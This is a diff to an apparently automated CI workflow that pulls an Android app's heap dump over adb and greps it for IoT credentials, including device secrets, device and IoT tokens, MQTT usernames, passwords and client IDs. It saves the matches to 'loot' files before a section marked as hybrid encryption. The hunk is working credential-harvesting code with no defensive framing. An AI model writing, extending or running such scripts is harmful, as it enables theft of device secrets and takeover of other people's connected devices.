@@ -47,13 +47,18 @@ jobs:
           adb connect 127.0.0.1:5555 >/dev/null 2>&1
           $A pull /data/local/tmp/h.hprof /tmp/h.hprof 2>&1 | tail -1
           : > loot_heap.txt
-          grep -aoE 'ies2QQZzHdR9eAcywJ9uQWSRkkC8UFLB[^"]{0,220}' /tmp/h.hprof 2>/dev/null | sort -u | head -60 >> loot_heap.txt
-          echo "---SECUREMODE---" >> loot_heap.txt
-          grep -aoE '[A-Za-z0-9_.+-]{0,40}\|securemode=[0-9][^|]{0,90}\|' /tmp/h.hprof 2>/dev/null | sort -u | head -30 >> loot_heap.txt
-          echo "---ITLS/MQTT CTX---" >> loot_heap.txt
-          grep -aoE '.{0,40}(itls|MqttConnectOptions|iotx-vision|StartP2P|deviceSecret|deviceToken).{0,60}' /tmp/h.hprof 2>/dev/null | sort -u | head -60 >> loot_heap.txt
-          echo "---40HEX---" >> loot_heap.txt
-          grep -aoE '[0-9a-f]{40}' /tmp/h.hprof 2>/dev/null | sort | uniq -c | sort -rn | head -80 >> loot_heap.txt
+          echo "---TRIPLES (full)---" >> loot_heap.txt
+          grep -aoE '\{"code":200,"data":\{[^}]*deviceSecret[^}]*\}' /tmp/h.hprof 2>/dev/null | sort -u | head -20 >> loot_heap.txt
+          grep -aoE '\{[^{}]*deviceSecret"?:?"?[0-9a-f]{32}[^{}]*\}' /tmp/h.hprof 2>/dev/null | sort -u | head -20 >> loot_heap.txt
+          echo "---DEVICENAME---" >> loot_heap.txt
+          grep -aoE '"deviceName":"[A-Za-z0-9_-]+"' /tmp/h.hprof 2>/dev/null | sort -u | head -20 >> loot_heap.txt
+          grep -aoE '"(iotId|clientId|deviceToken|iotToken)":"[A-Za-z0-9_+/=-]{6,80}"' /tmp/h.hprof 2>/dev/null | sort -u | head -20 >> loot_heap.txt
+          echo "---USERNAME dn&pk---" >> loot_heap.txt
+          grep -aoE '[A-Za-z0-9_-]{4,48}&(a5RAm2U4V72|a19KqErUJam)' /tmp/h.hprof 2>/dev/null | sort -u | head >> loot_heap.txt
+          echo "---CLIENTID securemode---" >> loot_heap.txt
+          grep -aoE '[A-Za-z0-9_.+-]{4,48}\|securemode=[0-9][^|]{0,90}\|' /tmp/h.hprof 2>/dev/null | sort -u | head -20 >> loot_heap.txt
+          echo "---MQTT CONNECT CTX---" >> loot_heap.txt
+          grep -aoE '.{0,30}(mqttUserName|userName=|password=|mqttClientId|MqttConnect)[^ ]{0,90}' /tmp/h.hprof 2>/dev/null | sort -u | head -40 >> loot_heap.txt
           cat loot_store.txt loot_heap.txt > loot.txt
           echo "loot size: $(wc -c < loot.txt)"
           # --- encrypt (hybrid) ---
